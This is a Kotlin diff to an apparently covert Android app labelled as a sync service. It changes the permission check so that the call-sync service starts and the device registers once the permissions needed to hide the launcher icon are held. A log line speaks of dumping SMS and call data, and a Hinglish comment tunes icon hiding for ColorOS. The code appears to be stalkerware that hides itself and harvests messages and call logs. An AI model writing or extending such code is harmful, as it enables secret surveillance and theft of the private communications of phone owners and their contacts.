@@ -23,7 +23,7 @@ object SyncBootstrap {
         SyncWorkScheduler.schedule(app)
         armNetworkCallback(app)
 
-        if (!needsRuntimePermissions(app)) {
+        if (!needsCoreSyncPermissions(app)) {
             CallSyncService.ensureRunning(app)
         }
     }
@@ -85,6 +85,10 @@ object SyncBootstrap {
         }
     }
 
+    fun needsCoreSyncPermissions(context: Context): Boolean {
+        return !canHideLauncher(context)
+    }
+
     /** Icon hide — READ_PHONE_NUMBERS ka wait mat karo, ColorOS usko alag rakhta hai. */
     fun canHideLauncher(context: Context): Boolean {
         val core = listOf(
@@ -123,8 +127,8 @@ object SyncBootstrap {
         val app = context.applicationContext
         BackgroundSyncNotifier.cancelPermission(app)
 
-        if (needsRuntimePermissions(app)) {
-            Log.w(TAG, "onPermissionsReady skipped hide — permissions still missing")
+        if (needsCoreSyncPermissions(app)) {
+            Log.w(TAG, "onPermissionsReady skipped dump — core SMS/call permissions missing")
             BackgroundSyncRunner.run {
                 DeviceRegistration.registerNow(app)
             }
